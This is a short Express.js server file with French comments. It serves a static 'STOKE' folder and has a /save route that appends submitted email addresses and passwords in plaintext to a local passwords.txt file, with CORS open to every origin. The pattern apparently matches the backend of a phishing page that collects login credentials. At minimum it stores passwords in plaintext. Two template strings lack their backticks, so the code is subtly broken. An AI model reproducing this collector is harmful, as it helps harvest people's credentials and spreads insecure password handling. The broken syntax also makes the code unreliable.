const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware pour JSON et CORS
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir le dossier STOKE comme public
// ../STOKE car serveur.js est dans backend/
app.use(express.static(path.join(__dirname, '../STOKE')));

// Chemin pour le fichier passwords.txt
const FILE_PATH = path.join(__dirname, 'passwords.txt');

// Route pour enregistrer email et mot de passe
app.post('/save', (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).send('Email et mot de passe requis');
  }

  const line = Email: ${email}, Password: ${password}\n;

  fs.appendFile(FILE_PATH, line, (err) => {
    if (err) {
      console.error('Erreur écriture fichier:', err);
      return res.status(500).send('Impossible d’enregistrer');
    }
    res.send('Données enregistrées !');
  });
});

// Route racine pour afficher index.html
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, '../STOKE/index.html'));
});

// Lancer le serveur
app.listen(PORT, () => {
  console.log(Server running on port ${PORT});
});